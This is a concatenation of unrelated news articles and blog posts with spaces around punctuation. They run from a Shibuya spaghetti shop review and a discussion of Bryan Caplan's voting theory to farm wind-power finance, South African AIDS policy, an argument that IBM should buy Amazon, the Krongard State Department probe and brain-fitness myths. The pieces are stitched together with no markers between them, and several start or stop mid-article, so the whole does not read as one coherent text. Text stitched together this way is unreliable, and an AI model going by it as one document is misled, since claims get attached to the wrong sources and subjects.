Located on a tiny side street in the bustling section of Shibuya , you walk downstairs to get to it .
In business since 1953 , they serve all manner of Italian spaghetti - based dishes cooked perfectly al dente .
But the toppings are often pure Japanese .
I had spaghetti with spicy codfish roe , squid and shredded shiso leaves .
It was tangy , spicy and the perfect pasta fix .
My other half tried the spaghetti with salmon roe , codfish roe and shredded nori , or seaweed , pictured above .
It was also a winner and like my dish can be ordered in small , medium or large size .
Other toppings included grated daikon radish , natto ( fermented soybeans ) and various vegetables and seafood .
They also serve a variety of wonderfully Japanese influenced green salads .
Mine had shredded scallop and a sesame dressing .
Inexpensive , delicious and downright satisfying , for pasta lovers , this hole in the wall is not to be missed .
There is also the theory of what Caplan calls the Miracle of Aggregation .
As James Surowiecki illustrates in “ The Wisdom of Crowds ” ( 2004 ) , a large number of people with partial information and varying degrees of intelligence and expertise will collectively reach better or more accurate results than will a small number of like - minded , highly intelligent experts .
Stock prices work this way , but so can many other things , such as determining the odds in sports gambling , guessing the number of jelly beans in a jar , and analyzing intelligence .
An individual voter has limited amounts of information and political sense , but a hundred million voters , each with a different amount of information and political sense , will produce the “ right ” result .
Then , there is the theory that people vote the same way that they act in the marketplace : they pursue their self - interest .
In the market , selfish behavior conduces to the general good , and the same should be true for elections .
Caplan thinks that democracy as it is now practiced cannot be salvaged , and his position is based on a simple observation : “ Democracy is a commons , not a market . ”
A commons is an unregulated public resource — in the classic example , in Garrett Hardin ’s essay “ The Tragedy of the Commons ” ( 1968 ) , it is literally a commons , a public pasture on which anyone may graze his cattle .
It is in the interest of each herdsman to graze as many of his own cattle as he can , since the resource is free , but too many cattle will result in overgrazing and the destruction of the pasture .
So the pursuit of individual self - interest leads to a loss for everyone .
( The subject Hardin was addressing was population growth : someone may be concerned about overpopulation but still decide to have another child , since the cost to the individual of adding one more person to the planet is much less than the benefit of having the child . )
Caplan rejects the assumption that voters pay no attention to politics and have no real views .
He thinks that voters do have views , and that they are , basically , prejudices .
He calls these views “ irrational , ” because , once they are translated into policy , they make everyone worse off .
People not only hold irrational views , he thinks ; they like their irrational views .
In the language of economics , they have “ demand for irrationality ” curves : they will give up y amount of wealth in order to consume x amount of irrationality .
Since voting carries no cost , people are free to be as irrational as they like .
They can ignore the consequences , just as the herdsman can ignore the consequences of putting one more cow on the public pasture .
“ Voting is not a slight variation on shopping , ” as Caplan puts it .
“ Shoppers have incentives to be rational .
Voters do not . ”
Caplan suspects that voters cherish irrational views on many issues , but he discusses only views relevant to economic policy .
The average person , he says , has four biases about economics — four main areas in which he or she differs from the economic expert .
The typical noneconomist does not understand or appreciate the way markets work ( and thus favors regulation and is suspicious of the profit motive ) , dislikes foreigners ( and thus tends to be protectionist ) , equates prosperity with employment rather than with production ( and thus overvalues the preservation of existing jobs ) , and usually thinks that economic conditions are getting worse ( and thus favors government intervention in the economy ) .
Economists know that these positions are irrational , because the average person actually benefits from market competition , which provides the best product at the lowest price ; from free trade with other countries , which ( for American consumers ) usually lowers the cost of labor and thus the price of goods ; and from technological change , which redistributes labor from less productive to more productive enterprises .
The economic biases of the non-economist form a secular world view that people cling to dogmatically , the way they once clung to their religious faith , Caplan thinks .
People do not , he proposes , vote their self - interest : they are much more altruistic than the standard model , in which voters behave like shoppers , predicts .
( This explains the phenomenon , puzzling to many social critics , of the auto worker who supports the elimination of the inheritance tax and the Hollywood producer who favors its retention . )
“ Precisely because people put personal interests aside when they enter the political arena , ” Caplan says , “ intellectual errors readily blossom into foolish policies . ”
People really believe that the country would be better off if profits were regulated , if foreign goods were taxed , and if companies were prevented from downsizing .
Politicians who pander to these beliefs are more likely to be elected , and the special interests that lobby for protectionism and anticompetitive legislation are the beneficiaries — not the public .
The result , over time , is a decline in the standard of living .
Caplan insists that he is not a market fundamentalist , but he does think that most economists peg the optimal level of government involvement in the economy too high , because they overestimate the virtues of democracy .
He offers some suggestions for fixing the evils of universal democratic participation ( though he does not spend much time elaborating on them , for reasons that may suggest themselves to you when you read them ) : require voters to pass a test for economic competence ; give extra votes to people with greater economic literacy ; reduce or eliminate efforts to increase voter turnout ; require more economics courses in school , even if this means eliminating courses in other subjects , such as classics ; teach people introductory economics without making the usual qualifications about the limits of market solutions .
His general feeling is that if the country were run according to the beliefs of professional economists everyone would be better off .
Short of that consummation , he favors whatever means are necessary to get everyone who votes to think like a professional economist .
He wants to raise the price of voting .
It is not clear whether “ The Myth of the Rational Voter ” is intended merely to be provocative ( a motive that has been known to get other economists in big trouble ) or whether its recommendations for changing the rules for political participation are to be taken seriously ( and by whom ? ) .
The book is , in part , a challenge to some of the assumptions made about voting behavior in the academic field known as public choice theory .
Caplan has assembled a lot of data that reveal significant disparities between the average person ’s views on economic questions and the views of professional economists : the public thinks that the price of gasoline is too high , for instance , but most economists think it is about right or too low ; the public thinks that most new jobs being created in the United States are low - paying , but economists disagree ; the public thinks that top executives are overpaid , and economists do not .
Caplan ’s point is that voters ’ views on the economy are not random , the result of “ rational ignorance ” ; they reflect systematic biases caused by an erroneous understanding of the way economies work .
But , as Caplan certainly knows , though he does not give sufficient weight to it , the problem , if it is a problem , is more deeply rooted .
It ’s not a matter of information , or the lack of it ; it ’s a matter of psychology .
Most people do not think politically , and they do not think like economists , either .
People exaggerate the risk of loss ; they like the status quo and tend to regard it as a norm ; they overreact to sensational but unrepresentative information ( the shark - attack phenomenon ) ; they will pay extravagantly to punish cheaters , even when there is no benefit to themselves ; and they often rank fairness and reciprocity ahead of self - interest .
Most people , even if you explained to them what the economically rational choice was , would be reluctant to make it , because they value other things — in particular , they want to protect themselves from the downside of change .
They would rather feel good about themselves than maximize ( even legitimately ) their profit , and they would rather not have more of something than run the risk , even if the risk is small by actuarial standards , of having significantly less .
NEW YORK ( CNNMoney.com ) --
For Steve Tiedeman , a farmer in Woodstock , Minn. , it has n't been all that great of a year .
The weather 's been dry , and he 's lost about a third of the corn on his 1,000 acre farm .
But Tiedeman , along with a growing number of farmers across the Midwest , can now rely on another , more stable crop : wind power .
With the help of big companies that put up the cash , farmers once tied to the weather , government subsidies or the fluctuations of the commodity market can now rely on the relative stability of the wind .
" Sometimes it 's dry , but I do n't worry about the wind , " said Tiedeman , who installed two utility - scale turbines on his land in 2003 as part of a 12 - farmer , 24 turbine cooperative .
" And it does n't even take up an acre . "
For companies that help the farmers with financing , it 's a chance to earn what appears to be a handsome return on investment , and also support farm communities .
Which may explain why John Deere ( Charts , Fortune 500 ) , the venerable maker of tractors and other heavy equipment , is one of the bigger players in this growing game .
Deere , which can bring big money to the table and has a working relationship with many farmers going back generations , puts up about half the cost of the project , said Dan Juhl , president of Minnesota - based Juhl Energy Development Corp .
The farmer or group of farmers kicks in a small amount and then form a company , which then gets the remaining funding from a bank loan , said Juhl , who has worked with Deere and other creditors to orchestrate 20 or so such deals since 2001 .
Tiedeman did n't disclose the financial details of his deal .
But according to Juhl , finances of a typical deal involving 5 windmills and a group of four farmers might look like this :
Total project cost of $ 10 million .
Deere , or another creditor , puts up $ 4,950,000 .
The farmers kick in $ 10,000 a piece .
The remaining $ 5 million comes from a loan from a bank or other creditor .
The farmers ' cooperative secures a contract to sell power to a local utility , then puts up the wind turbines .
The projects are usually fairly small in scale , say 5 to 10 turbines producing 7.5 to 15 megawatts of power in total , or enough to power about 5,000 to 10,000 homes .
Deere gets the federal production tax credit of about 2 cents per kilowatt hour and just about all of the proceeds from selling the power for the first 10 years .
The farmers get a maintenance fee of about $ 20,000 a year each for managing the turbines - keeping the access roads plowed , calling technicians for repairs , handling the paper work with the utility .
After 10 years , when the loan is paid off and Deere has recouped its investment plus profit , the ownership structure flips , with the farmers becoming majority owners .
Selling the electricity can generate between $ 1 and $ 1.5 million a year in revenue .
The federal production tax credit is worth about another $ 500,000 annually .
The farmers collect the " maintenance fee " of $ 20,000 or so a year a piece .
" Twenty or $ 30,000 a year is nothing to sneeze at , " said Juhl .
" But after 10 years , the local farmer ends up owning the machines , and that 's when it becomes a real cash crop thing . "
Juhl said the electricity agreements with the utilities are typically in place for 20 years , so the farmer should be able to turn a nice profit before the turbines require replacing .
He said in some deals a portion of the yearly budget is set aside for maintenance and dismantling the turbines .
Tiedeman , the farmer , said so far he 's happy with his deal .
But one crucial test will be seeing how well the turbines hold up , as any repairs would cut into his profits .
" It 's good , for what we 're getting out of it , " he said .
" As long as we do n't have any problems . "
Others see the scheme as a win - win for everyone .
" This combines rural development with energy policy , " said John Farrell , a research associate at the Minneapolis - based Institute for Local Self - Reliance .
" If you have local ownership , a lot more of the revenue goes right into the pockets of the farmers . "
As for working with Deere , which declined to comment due to a conflicting media interview , Juhl said " I was a little skeptical when the 800 pound gorilla came in and said ' help me , ' " he said .
' But they 're good guys , and they want to find a way to help farmers .
The more money farmers have , the more they can spend on green machinery . "
NAPLES , Italy -- 74 - year - old Italian grandmother who bought a sack of potatoes at the her local market found a live grenade among the spuds .
" I found a bomb in the potatoes , " Olga Mauriello said in a telephone interview with Reuters .
" I went to the market to buy some potatoes and that 's where the bomb was .
But this bomb was covered in dirt , and I put it in water and got all dirt off .
And then I realised ' It 's a bomb ' ! "
Police said the pine cone - shaped grenade , which had no pin and was still active , was the same type used by U.S. soldiers in Europe in World War Two .
Authorities believe the mix - up happened at a farm in France , where the grenade was plucked from the ground along with potatoes .
To the woman 's relief , police and explosives experts in the small town of San Giorgio a Cremano , near Naples , recovered the grenade and safely detonated it on Wednesday .
But Mauriello was still shaking off her close brush with death .
It did n't look like a potato and it was heavier than one .
But what if she had cooked it ?
" If I had n't felt its weight , I would n't even have realised that it was a bomb , " she said .

" We must take our fight against Aids to a much higher level , " the deputy president , Phumzile Mlambo - Ngcuka , told a conference of Aids activists , who until recently had been ignored and even denounced by the government .
" We must tighten up so that ARV [ antiretroviral ] drugs are more accessible , especially to the poor .
Education and prevention of HIV infection must be scaled up .
Our people want us to unite on this issue in the best interests of the health and wellbeing of our nation .
Working together we can defeat this disease , " she said to cheers from a crowd of health professionals , church leaders and labour officials .
Experts said the government 's policy change could save thousands of lives .
An estimated 5.4 million of South Africa 's 47 million people are infected with HIV , one of the highest ratios in the world .
" This is a sea change , " said Mark Heywood , director of the Aids Law Project .
" We 're not across the ocean yet , but now the government is sailing in the right direction . "
Activists fought a prolonged legal battle that forced president Thabo Mbeki 's government to distribute the life - saving ARV drugs through the public health services .
" The government is finally acknowledging that Aids is a serious national problem and is taking a scientific approach to tackling it .
It 's long overdue , but it is worth celebrating , " said a senior doctor working in a government hospital .
Mr Mbeki had questioned that Aids was caused by HIV and said it was not certain that ARV drugs were safe and effective .
He denied knowing anyone who had died of Aids , despite several prominent South Africans succumbing .
After a 2003 court ruling , the government reluctantly rolled out a public programme to make ARV drugs available to people with Aids .
About 200,000 people receive the government drugs , making the public programme one of the biggest in the world .
But they are reaching just one quarter of the estimated 800,000 in need .
Confusion over what is effective Aids treatment was spread by the health minister , Manto Tshabalala - Msimang , who adamantly promoted a diet of beetroot , lemons and garlic as an alternative treatment .
At the Toronto Aids conference in August , she sparked an uproar with a South African government display of the fruits and vegetables but no ARV drugs .
The South African government 's position on Aids was denounced as " wrong , immoral and indefensible " by theUN 's top official on Aids , Stephen Lewis .
President Mbeki has been silent on Aids issues recently and has not sacked Ms Tshabalala - Msimang as demanded by international and domestic Aids campaigners .
But significantly , the president marginalised the health minister by making his deputy president the head of an Aids taskforce and it appears he authorised her to change government policies .
In recent weeks the soft - spoken but savvy Phumzile Mlambo - Ngcuka had signalled the change by meeting privately with Aids specialists whom the government had previously refused to consult .
She has accepted that Aids is caused by HIV and emphasised that ARV drugs are central to fighting the disease .
A month ago , Aids activist Zackie Achmat and 40 members of the Treatment Action Campaign were arrested for demonstrating in government offices for the sacking of Ms Tshabalala - Msimang .
Yesterday Mr Achmat , in his trademark " HIV Positive " T - shirt , walked arm in arm with the deputy president and was kissed and hugged by other top officials .
" This is a serious , significant change .
The government wants to work with us , not against us , " he said .
" By increasing the availability of drugs , particularly for preventing mother to child transmission , the government is going to save lives . "
I have written a couple of pieces recently arguing that IBM needs to rethink its attitudes to “ consumer ” vs enterprise , because the distinctions are blurring .
But rather than go negative all the time , I figure now is a good time to drop a post I have been considering for a while .
I am not a numbers guy but I understand Amazon is not over - valued at the moment .
Buying the company could be a transformative acquisition that would bring IBM new opportunities in both business process outsourcing ( BPO ) and grassroots development .
Most importantly buying Amazon would also put IBM back in touch with consumers again , a calling card it lost when it spun off Lenovo , as well as bringing thousands of small booksellers to IBM as customers , expanding its small to medium enterprise footprint .
Did I happen to mention that Amazon is emerging as a major software - as - a - service player … What might some objections be ?
IBM can’t compete with its customers , and Amazon is an online retailer , which might damage relationships with other retailers .
This objection can be answered by pointing out that Amazon provided fulfillment services to Borders.com for seven years , before the ties were recently broken .
Amazon long ago became more than an ecommerce site , and its distribution network is a powerful one .
Its a tremendous asset .
What about smaller retailers ?
There was a time when people argued Amazon would put smaller booksellers out of business .
The opposite may be true .
I remember my surprise when I talked to a small bookshop once a few years ago , and the owner talked passionately about how easy it was to sell books through Amazon , to get on its platform ( a classic onramp for sales and continuing trust ) and to sell against major retailers .
Is it really off limits for IBM to buy into retail anyway ?
If IBM can buy a share in a Chinese bank , as it recently did , its clearly time to rethink what IBM is , and what risks it is prepared to take .
Talking of risk , I would argue IBM is too risk averse at the moment .
IBM is doing a great job of deepening its ties with the Fortune 500 – increasing its sales there at the expense of competitors .
Collaborative innovation is great , and will earn IBM billions of dollars of revenues over the next few years .
But would IBM ever foster the next YouTube or Twitter ?
I ca n’t see it .
Grassroots developers do n’t see IBM as a potential supplier .
Sun is explicitly targeting startups at the moment , and next gen Web 2.0 datacenters .
IBM R&D is now almost entirely large - enterprise customer driven , a massive change from the old days of invent it , sit back and watch someone else make the money on the idea .
But this conservatism goes to far .
After all – the big companies IBM will engage in collaborative innovation projects with are just too big to be truly innovative .
Even Google is finding it hard to compete these days in some areas as it morphs into a BigCo – Twitter handed Dodgeball a beating .
Twitter runs Ruby on Rails on Joyent which runs on Sun hardware .
Wait a minute – anyone would think Sun had a plan … they should come up with a cool name for it , participation age or something , because its about helping people to participate in the network …
IBM talked about On Demand then seemingly dropped it like a hot brick just as the concepts started to become reality .
Amazon may not be making money on its
On Demand offerings yet , but developers and startups are heading to Amazon Web Services in droves .
People blog their monthly payments to Amazon EC2 as a badge of honour .
People argue that Amazon has removed the need for capacity planning .
How many IBM customers are like Gumiyo ?
Within three weeks , Gumiyo , an online mobile commerce provider , had a complete production environment running on the Amazon Web Services platform , including web servers , database servers , and load balancers .
So IBM could gain new SMB customers , a new and truly On Demand infrastructure for developers , and a new Business Process outsourcing capability .
What ’s not to like ?
Of course such an acquisition would entail significant risk .
It would mean IBM changing its views on some things – but it would also be a swing to the reality of individual2enterprise network convergence .
Sramana Mitra calls out the Extended Enterprise thusly :
The modern enterprise is no longer one , monolithic organization .
Customers , Partners , Suppliers , Outsourcers , Distributors , Resellers , … all kinds of entities extend and expand the boundaries of the enterprise , and make “ collaboration ” and “ sharing ” important .
Let ’s take some examples .
The Salesforce needs to share leads with distributors and resellers .
The Product Design team needs to share CAD files with parts suppliers .
Customers and Vendors need to share workspace often .
Consultants , Contractors ,
Outsourcers often need to seamlessly participate in the workflow of a project , share files , upload information .
All this , across a secure , seamlessly authenticated system .
Right now IBM is very well set up for selling to Enterprise 1.0 .
But selling to Enterprise 2.0 is going to mean selling to the active end - points , or at least having a conversation with them .
IBM needs a ubiquity play .
It needs an storage cloud play .
With Amazon on board it would have these things .
IBM would be part of the internet backbone , and that ’s where it has to be .

David Letterman on Thursday announced a segment on " George Bush vs. Mahmoud Ahmadinejad , " promising also that each joke " will be punctuated with a ridiculous sound effect . "
Along with celebrity gags and jokes playing off the Iranian president 's popular image as a bloodthirsty tyrant , some of the more interesting comparisons were :
" Ahmadinejad : Member of the Islamic Society of Engineers .
Bush : Member of the Chuck Norris fan club . "
" Ahmadinejad : Speaks in broken , hard - to - understand English .
Bush : Speaks in broken , hard - to - understand English . "
" Ahmadinejad : Holocaust denier .
Bush : Global warning denier . "
And finally , " Ahmadinejad : Underlings refer to him as President of the Islamic Republic of Iran .
Bush : Underlings refer to him as ' President Numbnuts . ' "

Howard Krongard Forced to Recuse Himself from a Second Probe After Improperly Meeting with Subjects of Criminal Investigation into Iraq Embassy Contracts
Why Is this Man Still Serving as State Dept. Inspector General ?
Jon Ponder Byon

Guest blogged by Jon Ponder , Pensito Review .
Howard Krongard , the inspector general ( IG ) for the Bush State Dept. , has recused himself from a second major probe under his purview .
The new recusal was announced yesterday and came at the " request " of House Oversight and Government Reform Committee Chairman Henry Waxman ( D - CA ) .
This new development follows a dramatic moment during a hearing before Waxman 's committee on Wednesday when Kronberg was forced to recuse himself from an investigation into Blackwater after it was revealed that , despite his earlier denials , his brother sits on an advisory board for the controversial paramilitary government security contractor .
Making matters potentially worse for Krongard , his brother , Buzzy Krongard , issued a statement after the hearing contradicting Howard 's testimony regarding the timing of when Howard learned that Buzzy had accepted a seat on the Blackwater board .
It is unclear at the moment whether Democrats on the committee will pursue perjury charges against the State Dept .
IG .
Krongard 's latest recusal stems from what appears to be obstruction of justice and witness tampering in a criminal probe by the Dept. of Justice into the way billions of dollars in contracts for the construction of the U.S. embassy complex in Baghdad were let by the State Dept . :
A report by the committee 's majority staff referred to the Justice Department probe and also said that Krongard , against his staff 's advice , met in August with someone implicated in " potential criminal activity " uncovered during a State Department audit of the embassy contract .
Then , the report said , Krongard met in September with someone else under investigation by the Justice Department .
A source , speaking on the condition of anonymity , identified that person as [ Mary French is the embassy project coordinator based in Baghdad ] .
When Krongard arrived in Baghdad , he was warned by his deputy that French had become a " subject of investigation " and that he should not meet with her , for fear of tainting the investigation .
But , the report said , " Krongard went through with the meeting and spent several hours with this individual . "
James L. Golden , an embassy project overseer who works on a contract basis for the State Dept. in Washington , and who is also said to be a subject of the DoJ probe , may be the other person of interest Krongard met with .
Sean McCormack , a State Dept. spokesman , said Krongard recused himself from the embassy contracts investigation at Chairman Waxman 's request :
" That was at the request of Congressman Waxman 's committee because they are doing their own inquiries into the new embassy compound , " McCormack said .
" Because of the reporting relationship between the IG and the Congress , of course , Howard honored that request . "
Despite Krongard 's removal from the two highest profile investigations by his office , McCormack says he still has the confidence of Sec. of State Condoleeza Rice .
The Vista users of Lund over in Sweden can't access the Internet through their Linux network .
Imagine , an entire city running its digital infrastructure on Linux .
Beautiful , right ?
Now imagine the frustration of Vista users when their Microsoft OS denies them access to the Internet due to some small bug in some Microsoft code .
Frustrating indeed .
The city of Lund , Sweden has been in the digital dark as Vista OS users cannot gain Internet access through the city 's Linux based communications infrastructure .
The company in charge if that city wide system , Lundis Energi , had said that the problem persists because of a bug in some Vista code .
Lundis Energi also said that they are in no way willing to change the configuration of their server to cope with the flaw .
Microsoft has n't offered any statement of fix as of yet , but a local Microsoft rep had siad that the folks in Redmond could fix the problem easily enough if Lundis Energi was just a little more forth coming with the details .
Who 's to blame .
Well , both actually .
Lundis Energi should have been testing Vista back in its early alpha release stages to ensure compatibility with their Linux based server system .
On the flip side , Microsoft has to get into gear with increased interoperability between Vista , Linux , XP , OSX , FreeBSD and every other operating system choice available on the market today .
Besides , with Apache ( a Linux type web server ) being the dominant web server with more than 50 percent market share world wide , Microsoft should bow down just a little and open a window or two to help let the penguin in .
After all , only a third of the web servers on earth run Microsoft .

1990 Ancestry maps
Ancestry can refer to either a person 's ethnic origins or descent , " roots " , or heritage or the place of birth of a person or that person 's ancestors .
These maps are based on data from the 1990 Census .
They show an estimate of how many people of a certain ancestry will live in each of Minnesota 's cities and townships ( MCDs ) and in each county in the United States .
These maps are intended to give the viewer some idea of the location , concentration , and historical settlement patterns of some of the largest ancestry groups in Minnesota and the United States .
Each of the maps in this library varies in size from 15 K to 33 K .
Ancestry Groups in Minnesota
These maps show how many people in each city or township ( MCD ) in Minnesota identify with certain ancestry groups per 1,000 persons living in that city or township .
Ancestry Groups in the United States
These maps show how many people per county nation wide identify with certain ancestry groups per 1,000 persons living in that county
Documentation
The data used to create these maps comes from questionnaire item 13 , which asks respondents to identify the ancestry groups with which they identified most closely .
All data comes from respondents who reported a single ancestry ( although multiple responses were accepted for this question ) .
Some multiple responses ( such as French Canadian or Scotch - Irish ) are treated as a single response , reflecting their status as a unique ancestry group .

A PROMINENT American once said , about immigrants , “ Few of their children in the country learn English ...
The signs in our streets have inscriptions in both languages ...
Unless the stream of their importation could be turned they will soon so outnumber us that all the advantages we have will not be able to preserve our language , and even our government will become precarious . ”
This sentiment did not emerge from the rancorous debate over the immigration bill defeated last week in the Senate .
It was not the lament of some guest of Lou Dobbs or a Republican candidate intent on wooing bedrock conservative votes .
Guess again .
Voicing this grievance was Benjamin Franklin .
And the language so vexing to him was the German spoken by new arrivals to Pennsylvania in the 1750s , a wave of immigrants whom Franklin viewed as the “ most stupid of their nation . ”
About the same time , a Lutheran minister named Henry Muhlenberg , himself a recent arrival from Germany , worried that “ the whole country is being flooded with ordinary , extraordinary and unprecedented wickedness and crimes .
...
Oh , what a fearful thing it is to have so many thousands of unruly and brazen sinners come into this free air and unfenced country . ”

SNOW MAKES HIS CASE ….
Tony
Snow wrote an op -ed for USA Today presenting a defense for the president ’s commutation of Scooter Libby ’s prison sentence .
He did n’t get a lot of space — 382 words is n’t much — but before a White House spokesperson publishes a piece like this in a national newspaper , it has to be vetted by the counsel ’s office , the political affairs office , the communications office , and the press office .
In other words , Snow ’s piece should be the best argument ( s ) the White House has to offer .
And if that ’s the case , the Bush gang really has n’t been able to think of much .
Let ’s dig in , shall we ?
Libby was convicted of obstruction of justice and perjury ; was fined $ 250,000 ; must serve two years probation ; and will likely lose his license to practice law .
That qualifies as a stern penalty for a first - time offender with a long history of public service .
Libby may not have to pay the fine himself ; Libby may not get two years probation ; and according to federal sentencing guidelines , his penalty was anything but “ stern . ”
For that matter Victor Rita is also a first - time offender with a long history of public service .
How ’d things work out for him ?
The Constitution gives the president the power to grant clemency in a wide range of cases , at his discretion , with no restrictions .
In the final hours of the Clinton administration , this unfettered authority was embodied in a mad rush to push through pardons with dizzying haste .
Tony
Snow managed to wait until the second paragraph to say , “ Clinton did it ! ”
Let ’s all applaud Snow ’s impressive restraint .
He only got six paragraphs to make his case , and he devoted one of them to a tangent .
[ Bush ] believes pardons and commutations should reflect a genuine determination to strengthen the rule of law and increase public faith in government .
Can’t…type…laughing …too…hard ….
[ T ]he president made clear that he would not second - guess the jury that found Libby guilty .
Actually , the president made clear he may ultimately overturn the jury ’s decision with a possible pardon .
Many analysts cleverly avoid grappling with either of these issues , and instead try to analyze the commutation as a raw political exercise .
That sort of analysis is off - base .
The president was not motivated by politics in making this decision .
No , of course not .
What ever could have given us that idea ?
The president who has issued fewer pardons and commutations than any modern president just happened to take an interest in this case .
Just a coincidence .
No politics here at all .
[ Bush ] did what he does normally , and what makes those of us who work for him proud .
Normally ?
The president routinely spends weeks and weeks mulling over commutation applications that have n’t even been filed ?
If this op - ed is the best the White House has got , they ’ve got nothing .
Blue Oregon
It was buried in the second - to - last paragraph of a story on page 20 of Willamette Week , but Senator Wyden ’s comments regarding impeachment of the President are sure to raise eyebrows in the nation ’s capital .
It seems that local activist John Bradach ( whose nephew was killed while serving in Iraq ) has been pestering Oregon ’s congressional delegation to join his call for impeachment .
From WW :
Since no pol answered Bradach ’s calls , we decided to give them a ring .
And guess what ?
Of the seven politicians representing Oregon , plus one from southwest Washington , only two called us back to answer our questions about impeachment . …
Sen. Ron Wyden ( D - Ore. ) says he ’d rather use the next year and a half to “ enact universal health care , achieve energy independence and remove troops from Iraq ” but would keep “ an open mind ” if the House of Representatives passed articles of impeachment , the first stage in impeachment proceedings .

Maybe you 've heard about the idea , but have you ever wondered what really goes into living " off the grid " ?
The cost and sacrifices might surprise you !
Over the last year we have inter­viewed a num­ber of lead­ing brain health and fit­ness sci­en­tists and prac­ti­tion­ers world­wide to learn about their research and thoughts , and have news to report .
What can we say today that we could­ n’t have said only 10 years ago ?
That what neu­ro­science pio­neer San­ti­a­go Ramon y Cajal claimed in the XX cen­tu­ry , “ Every man can , if he so desires , become the sculp­tor his own brain ” , may well become real­i­ty in the XXI .
And influ­ence Edu­ca­tion , Health , Train­ing , and Gam­ing in the process .
We have only scratched the sur­face of what sci­ence - based struc­tured cog­ni­tive ( i.e. , men­tal ) exer­cise can do for brain health and pro­duc­tiv­i­ty .
We are now wit­ness­ing the birth of a new indus­try that cross­es tra­di­tion­al sec­tor bound­aries and that may help us under­stand , assess and train our brains , har­ness­ing the grow­ing research about neu­ro­ge­n­e­sis ( the cre­ation of new neu­rons ) , neu­ro­plas­tic­i­ty ( the abil­i­ty of the brain to rewire itself through expe­ri­ence ) , cog­ni­tive train­ing and emo­tion­al reg­u­la­tion .
Let ’s now debunk 10 myths , still too preva­lent , that may pre­vent us from see­ing the full poten­tial of this emerg­ing field :
Myth 1 : It ’s all in our genes .
Real­i­ty : A big com­po­nent of our life­long brain health and devel­op­ment depends on what we do with our brains .
Our own actions , not only our genes , influ­ence our lives to a large extent .
Genes pre­dis­pose us , not deter­mine our fates .
“ Indi­vid­u­als who lead men­tal­ly stim­u­lat­ing lives , through edu­ca­tion , occu­pa­tion and leisure activ­i­ties , have reduced risk of devel­op­ing Alzheimer ’s .
Stud­ies sug­gest that they have 35 – 40 % less risk of man­i­fest­ing the dis­ease ” — Dr. Yaakov Stern , Divi­sion Leader of the Cog­ni­tive Neu­ro­science Divi­sion of the Sergievsky Cen­ter at Colum­bia Uni­ver­si­ty .
Myth 2 : The field of Cognitive / Brain Fit­ness is too new to be cred­i­ble .
Real­i­ty :
The field rests on sol­id foun­da­tions dat­ing back more decades — what is new is the num­ber and range of tools that are now start­ing to be avail­able for healthy indi­vid­u­als .
“ Rig­or­ous and tar­get­ed cog­ni­tive train­ing has been used in clin­i­cal prac­tice for many years .
Exer­cis­ing our brains sys­tem­at­i­cal­ly is as impor­tant as exer­cis­ing our bod­ies . ” — Dr. Elkhonon Gold­berg , neu­ropsy­chol­o­gist , clin­i­cal pro­fes­sor of neu­rol­o­gy at New York Uni­ver­si­ty School of Med­i­cine , and dis­ci­ple of Alexan­der Luria .
“ Today , thanks to fMRI and oth­er neu­roimag­ing tech­niques , we are start­ing to under­stand the impact our actions can have on spe­cif­ic parts of the brain . ” — Dr. Judith Beck , Direc­tor of the Beck Insti­tute for Cog­ni­tive Ther­a­py and Research .
Myth 3 : Med­ica­tion is and will remain the only evi­dence - based inter­ven­tion for a num­ber of brain - relat­ed prob­lems .
Real­i­ty : Cog­ni­tive train­ing pro­grams are start­ing to show val­ue as com­ple­ments to drug - based inter­ven­tions .
“ Cog­ni­tive train­ing rests on sol­id premis­es , and some pro­grams already have very promis­ing research results ” - Pro­fes­sor David Rabin­er , Senior Research Sci­en­tist and Direc­tor of Psy­chol­o­gy and Neu­ro­science Under­grad­u­ate Stud­ies at Duke Uni­ver­si­ty .
Myth 4 : We need to buy very expen­sive stuff to improve our brains .
Real­i­ty : Every time we learn a new skill , con­cept or fact , we change the phys­i­cal com­po­si­tion of our brains .
Life­long learn­ing means life­long neu­ro­plas­tic­i­ty .
“ Learn­ing is phys­i­cal .
Learn­ing means the mod­i­fi­ca­tion , growth , and prun­ing of our neu­rons , connections –called synaps­es– and neu­ronal net­works , through experience …we are cul­ti­vat­ing our own neu­ronal net­works . ” — Dr. James Zull , Pro­fes­sor of Biol­o­gy and Bio­chem­istry at Case West­ern Uni­ver­si­ty ,
Myth 5 : Schools should just focus on basic skills like Read­ing and Math .
Real­i­ty : “ Men­tal mus­cles , ” such as work­ing mem­o­ry , are fun­da­men­tal to aca­d­e­m­ic per­for­mance and are cur­rent­ly over­looked by the school sys­tem .
“ I do n’t see that schools are apply­ing the best knowl­edge of how minds work .
Schools should be the best place for applied neu­ro­science , tak­ing the lat­est advances in cog­ni­tive research and apply­ing it to the job of edu­cat­ing minds . ” — Dr. Arthur Lavin , Asso­ciate Clin­i­cal Pro­fes­sor of Pedi­atrics at Case West­ern School of Med­i­cine .
Myth 6 : Cross­word puz­zles , or our dai­ly job activ­i­ties , are the best way to keep one ’s mind sharp .
Real­i­ty : Com­put­er - based pro­grams can be more effec­tive at train­ing spe­cif­ic cog­ni­tive skills .
“ What research has shown is that cog­ni­tion , or what we call think­ing and per­for­mance , is real­ly a set of skills that we can train sys­tem­at­i­cal­ly .
And that com­put­er - based cog­ni­tive train­ers or “ cog­ni­tive sim­u­la­tions ” are the most effec­tive and effi­cient way to do so . ” — Dr. Daniel Gopher , Pro­fes­sor of Human Fac­tors Engi­neer­ing at Tech­nion Insti­tute of Sci­ence .
Myth 7 : Videogames are always a waste of time .
Real­i­ty : Sci­en­tif­i­cal­ly - designed , com­put­er - based pro­grams can be a good vehi­cle for train­ing spe­cif­ic skills .
For exam­ple , it has been shown that short term mem­o­ry can be expand­ed by such pro­grams .
“ We have shown that work­ing mem­o­ry can be improved by train­ing . ” – Dr. Torkel Kling­berg , Direc­tor of the Devel­op­men­tal Cog­ni­tive Neu­ro­science Lab at Karolin­s­ka Insti­tute .
Myth 8 : This means kids will spend more time play­ing videogames .
Real­i­ty :
In Japan – the world ’s ear­li­est adopter of brain - relat­ed videogames - over­all home videogame sales have declined , with chil­dren play­ing less over time .
Inter­est­ing­ly , adults in Japan have start­ed to play brain - relat­ed video games more , and we are start­ing to see the same trend with adults in the US and Europe .
“ The sales of soft­ware on home game machines have declined ( in Japan ) from its peak of 533 bil­lion yen in 1997 to 53 % of that amount , 315 bil­lion yen in 2005 ” — Go Hira­no , Japan­ese exec­u­tive .
Myth 9 : Brain exer­cise is only for seniors .
And , only about mem­o­ry .
Real­i­ty : Peo­ple of all ages can ben­e­fit from a vari­ety of reg­u­lar brain exer­cis­es .
For active pro­fes­sion­als , man­ag­ing stress and emo­tions is often a good first step .
